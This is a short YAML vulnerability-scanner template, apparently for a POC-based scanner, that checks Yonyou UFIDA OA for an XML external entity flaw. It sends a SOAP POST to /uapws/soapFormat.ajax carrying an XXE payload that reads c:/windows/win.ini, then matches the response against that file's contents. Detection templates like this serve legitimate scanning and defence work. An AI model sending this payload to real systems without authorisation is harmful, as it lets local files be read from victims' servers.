expression: r0()
id: yongyou-ufida-oa-uapws-xxe
info:
  author: zan8in
  name: "\u7528\u53CB UFIDA OA XXE"
  severity: high
rules:
  r0:
    expression: response.status == 200 && (response.body.bcontains(b"for 16-bit app
      support") || response.body.bcontains(b"[extensions]"))
    request:
      body: 'msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:///c:/windows/win.ini">
        ]>

        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">

        <soap:Body>

        <soap:Fault>

        <faultcode>soap:Server%26xxe1two%3b</faultcode>

        </soap:Fault>

        </soap:Body>

        </soap:Envelope>%0a

        '
      method: POST
      path: /uapws/soapFormat.ajax
